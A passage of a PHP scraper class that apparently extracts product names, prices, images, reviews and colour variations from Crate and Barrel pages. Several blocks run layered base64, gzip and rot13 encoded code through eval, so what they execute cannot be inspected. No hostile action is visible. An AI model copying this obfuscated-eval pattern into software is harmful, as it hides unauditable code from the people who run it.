1SaKzA5f7VfUa2otvKGflGws0psSv59RGC6kEVunF7RgMBS0rxt00dP+mWDSDpLBi255j1AB/b6J5p//1S8OWU/agKoN681x1KrQYyild3yqgSpBfGzBPyVO5tq+1+iNuExeOrRBph/Pxyc4R2WZlqUK/MF//WUg0ggRigtTzH4jy6Bis5TyvuB0rN2uG5u+w+rDMU+FMh4CgXeKRpeRqL23iu1xRuC/ZoctwzznQOzV1EUeblb8X9m0GdyQJmEOZjVkTbrmJgpCRrX9cFlqFXWGPq7wq3d+eGtXCO6PpP21Zij+wYGQIS4XhUInzblIgq9ccGY+Qe1SxHqRr6W4yrXyJ7aISBfWbsrtoG+624r0jv+/MwGxLkzKKeoSXlS0P/k/PWdDJ99zeIZQCBd7iu8/eTs3ZF356Ujy62P1dtv8+rpy0uR4R4BouDLHAQ7Y/DZSkgbVpeu2BKh+Gk6pJtq39SmRopw0FXTK9UB6cWcqz2XLdigoPuTlOeeVuRscYaao0/GhK0ohlKRLbT+Tbk/poGv/edc8NX7Shk8Ov1m3yHN4PKb4GTgA01lpB9DFDhy2LejELeVUPfV1+N2L1Bgut8uqlp76yhkI/D8G3oXOwVRciiug0xs/YGh0r0PSkokf4hsidhwWn8PqDu6Jjo0jAS0aaWm57O0Ln90DTC7UbM90/mRD6E8OLNbsyMs7W5LGUG23BwSPaieAL6X5x5xf0rYM2f/wHtv38D')))));


		if(preg_match_all('/\<li\>(.+?)\<\/li\>/', $features, $features_broken))
			if(isset($features_broken[1]))
				$features = $features_broken[1];

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

		$imageCarousel = $this -> parse_using('/zoomableCarousel.+data-showcase-Data=\"(\{.+?\})\"/i', true);
		$newDigitalData = $this -> parse_using('/digitalData.+?\(\{\}.+?({.+?})\)/i', true);

		$result = array();
		$variation = array();

		if(isset($product_info[1])){
			$product_info = json_decode(html_entity_decode($product_info[1]), true);

			$other_images = false;

			// new code
			if(isset($imageCarousel['images'])){
				foreach ($imageCarousel['images'] as $image) {
					$other_images[] = $image['portraitSrc'];
				}
				if(count($other_images) > 1)
					array_shift($other_images);
			}

			// old code
			// if(isset($digital_data['BrowseDto']['ImageGallerySchemaMarkup']['associatedMedia']))
			// 	foreach ($digital_data['BrowseDto']['ImageGallerySchemaMarkup']['associatedMedia'] as $images) {
			// 		$other_images[] = $images['contentUrl'];
			// 	}

			$review_info = false;

			// new code
			if(isset($newDigitalData['page']['attributes']['review']['reviewCount']))
				$review_info['ReviewCount'] = $newDigitalData['page']['attributes']['review']['reviewCount'];
			if(isset($newDigitalData['page']['attributes']['review']['averageReview']))
				$review_info['ReviewRating'] = $newDigitalData['page']['attributes']['review']['averageReview'];
			if($review_info['ReviewCount'] == 0)
				$review_info['ReviewRating'] = 0;			


			// old code
			// if(isset($digital_data['BrowseDto']['ReviewCount']))
			// 	$review_info['ReviewCount'] = $digital_data['BrowseDto']['ReviewCount'];
			// if(isset($digital_data['BrowseDto']['ReviewRating']))
			// 	$review_info['ReviewRating'] = $digital_data['BrowseDto']['ReviewRating'];
			// if($review_info['ReviewCount'] == 0)
			// 	$review_info['ReviewRating'] = 0;

			$result = array(
				'CategoryId' => $product_info['categoryId'],
				'familyID' => $product_info['familyId'],
				'SKU' => $product_info['sku'],
				
				// new code
				'Name' 			=> isset($newDigitalData['product'][0]['productInfo']['productName']) ? strip_tags($newDigitalData['product'][0]['productInfo']['productName']) : null,
				'Description' 	=> isset($newDigitalData['product'][0]['productInfo']['description']) ? strip_tags($newDigitalData['product'][0]['productInfo']['description']) : null,
				'CurrentPrice' 	=> isset($newDigitalData['product'][0]['attributes']['price']['currentPrice']) ? $newDigitalData['product'][0]['attributes']['price']['currentPrice'] : null,
				'RegularPrice' 	=> isset($newDigitalData['product'][0]['attributes']['price']['regularPrice']) ? $newDigitalData['product'][0]['attributes']['price']['regularPrice'] : null,
				'PrimaryImage' 	=> isset($imageCarousel['imageSrc']) ? $imageCarousel['imageSrc'] : null,
				// 'Category' 		=> isset($newDigitalData['product'][0]['attributes']['category']) ? $newDigitalData['product'][0]['attributes']['category'] : array(),
				

				// old code
				// 'Name' => $product_info['name'],
				// 'Description' => strip_tags($digital_data['BrowseDto']['Description']),
				// 'CurrentPrice' => $digital_data['BrowseDto']['CurrentPrice'],
				// 'RegularPrice' => $digital_data['BrowseDto']['RegularPrice'],
				// 'PrimaryImage' => $digital_data['BrowseDto']['ImagePath'],
				// 'Category' => isset($digital_data['BrowseDto']['Category']) ? $digital_data['BrowseDto']['Category'] : array(),

				'SecondaryImages' => $other_images,
				'URL' => $product_info['navigateUrl'],

				'Reviews' => $review_info,
				'Dimentions' => $dimensions,
				'Features' => $features,
			);

			// if(isset($digital_data['BrowseDto']['ShippingDeliveryServiceLevel']))
			// 	$result['ShippingLevel'] = $digital_data['BrowseDto']['ShippingDeliveryServiceLevel'];
			// else if(isset($digital_data['BrowseDto']['ShippingPanel']['Level']))
			// 	$result['ShippingLevel'] = $digital_data['BrowseDto']['ShippingPanel']['Level'];
			// else
			// 	$result['ShippingLevel'] = 0;

			$result['isInHomeDelivery'] = (isset($product_info['availability']['promoMessageDetail']['popupName']) && $product_info['availability']['promoMessageDetail']['popupName'] == "FreeShip_InHome") ? true : false;

			if(isset($product_info['specialOrderProps']['model']['colorBar']['colorBarChoices'])){

				// handle image attribute generation
				$imageParam = 0;
				if(isset($product_info['specialOrderProps']['model']['currentOptionChoiceParameter']) && !empty($product_info['specialOrderProps']['model']['currentOptionChoiceParameter'])) {
					$imageParam = explode(',', $product_info['specialOrderProps']['model']['currentOptionChoiceParameter']);
					$imageParam = isset($imageParam[2]) ? $imageParam[2] : 0;
				}

				foreach ($product_info['specialOrderProps']['model']['colorBar']['colorBarChoices'] as $v) {

					// if variation has some other image param then use that
					$variationImageParam = 0;
					
					if(isset($v['optionChoiceParameter']) && !empty($v['optionChoiceParameter'])) {
						$variationImageParam = explode(',', $v['optionChoiceParameter']);
						$variationImageParam = isset($variationImageParam[2]) ? $variationImageParam[2] : $imageParam;
					}
					else
						$variationImageParam = $imageParam;

					$variation[] = array(
						'SKU' => isset($v['sku']) ? $v['sku'] : '',
						'Custom' => isset($v['SkuProperty']) ? $v['SkuProperty'] : (isset($v['skuProperty']) ? $v['skuProperty'] : ''),
						'OptionCode' => isset($v['optionCode']) ? $v['optionCode'] : '',
						'ChoiceCode' => isset($v['choiceCode']) ? $v['choiceCode'] : '',
						'ChoiceName' => isset($v['choiceName']) ? $v['choiceName'] : '',
						'ColorImage' => isset($v['imagePath']) ? $v['imagePath'] : '',
						'ColorImageZoom' => isset($v['zoomImagePath']) ? $v['zoomImagePath'] : '',
						'CurrentPrice' => $product_info['specialOrderProps']['model']['colorBar']['colorBarCount'] == 0 ? $result['CurrentPrice'] : 0,
						'RegularPrice' => $product_info['specialOrderProps']['model']['colorBar']['colorBarCount'] == 0 ? $result['RegularPrice'] : 0,
						'Image' => "https://images.crateandbarrel.com/is/image/Crate/item_{$product_info['specialOrderProps']['model']['collectionCode']}_{$product_info['specialOrderProps']['model']['itemTypeCode']}_{$v['choiceCode']}_{$imageParam}"
						// 'Image' => "https://images.crateandbarrel.com/is/image/Crate/item_{$product_info['specialOrderProps']['model']['collectionCode']}_{$product_info['specialOrderProps']['model']['itemTypeCode']}_{$v['choiceCode']}_0",
					);
				}
			}
			//handling different type of product ex atrium-tufted-black-patent-leather-bench/s677608
			else if(isset($digital_data['BrowseDto']['Grouper']['AttributeGroups'][0]['Attributes'])){
				foreach ($digital_data['BrowseDto']['Grouper']['AttributeGroups'][0]['Attributes'] as $v) {
					// echo json_encode($digital_data);die();
					$variation[] = array(
						'SKU' => isset($v['MatchingSkus'][0]) ? $v['MatchingSkus'][0] : '',
						'ChoiceName' => isset($v['Name']) ? $v['Name'] : '',
						'ColorImage' => isset($v['ImageUrl']) ? $v['ImageUrl'] : '',
						'ColorImageZoom' => isset($v['zoomImagePath']) ? $v['zoomImagePath'] : '',
					);
				}
			}
			else
				$variation = false;

			$result['Variations'] = $variation;

		}

		return $result;
	}

	public function get_variations($sku){

		$results = array();
		$headers = $this -> headers;

		if(empty($sku) || !is_numeric($sku))
			return array(
				'error' => 'get_product expect 1 parameter (sku) to be non empty and numeric'
			);	

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));


		$headers[] = 'Content-Type: application/json';
		$headers[] = 'Content-Length: ' . strlen($data_string);
		curl_setopt($this -> handle, CURLOPT_HTTPHEADER , $headers);
		curl_setopt($this -> handle, CURLOPT_CUSTOMREQUEST, "POST");                                                                     
		curl_setopt($this -> handle, CURLOPT_POSTFIELDS, $data_string);  
	    $this -> html = json_decode(curl_exec($this -> handle));

		if(isset($this -> html -> options[0]) && isset($this -> html -> options[0] -> optionChoices) && isset($this -> html -> options[0] -> priceGroupPrices)){
			foreach ($this -> html -> options[0] -> optionChoices as $variation) {
				$results[] = array(
					"OptionCode" => $variation -> optionCode,
					"ChoiceCode" => $variation -> choiceCode,
					"ChoiceName" => $variation -> name,
					"ColorImage" => $variation -> imagePath,
					"ColorImageZoom" => $variation -> zoomImagePath,
					"PriceGroup" => $variation -> priceGroupCode,
					"CurrentPrice" => $variation -> priceGroupCode == 0 ? $this -> html -> options[0] -> priceGroupPrices[0] -> currentPrice + $variation -> currentAddPrice : $this -> html -> options[0] -> priceGroupPrices[$variation -> priceGroupCode - 1] -> currentPrice,
					"RegularPrice" => $variation -> priceGroupCode == 0 ? $this -> html -> options[0] -> priceGroupPrices[0] -> regularPrice + $variation -> regulareAddPrice : $this -> html -> options[0] -> priceGroupPrices[$variation -> priceGroupCode - 1] -> regularPrice,
				);
			}
		}

		return $results;
	}

	public function get_category_by_id($argument){

		$results = array();

		$filters = array(
			"Arm_Style"        => "visualVariant.nonvisualVariant.gbi_Merged_arm_style",
			"Base_Material"    => "visualVariant.nonvisualVariant.gbi_Merged_base_material",
			"Collection"       => "visualVariant.nonvisualVariant.gbi_Merged_collection",
			"Color"            => "visualVariant.nonvisualVariant.gbi_Merged_color",
			"Features"         => "visualVariant.nonvisualVariant.gbi_Merged_features",
			"Material"         => "visualVariant.nonvisualVariant.gbi_Merged_material",
			"Pattern"          => "visualVariant.nonvisualVariant.gbi_Merged_pattern",
			"Type"             => "visualVariant.nonvisualVariant.gbi_Merged_product_type",
			"Seating_Capacity" => "visualVariant.nonvisualVariant.gbi_Merged_seating_capacity",
			"Shape"            => "visualVariant.nonvisualVariant.gbi_Merged_shape",
			"Top_Material"     => "visualVariant.nonvisualVariant.gbi_Merged_top_material",

			"Depth"            => "visualVariant.nonvisualVariant.gbi_depthRangeFilter",
			"Diameter"         => "visualVariant.nonvisualVariant.gbi_diameterRangeFilter",
			"Height"           => "visualVariant.nonvisualVariant.gbi_heightRangeFilter",
			"Price"            => "visualVariant.nonvisualVariant.gbi_priceRangeFilter",
			"Width"            => "visualVariant.nonvisualVariant.gbi_widthRangeFilter",
		);

		if(is_array($argument)){
			$id = $argument['category_id'];
			$params = $argument['filters'];
		}
		else{
			$id = $argument;
			$params = $_GET;
		}

		$filtersToApply = array();
		foreach ($filters as $filterName => $filterValue){
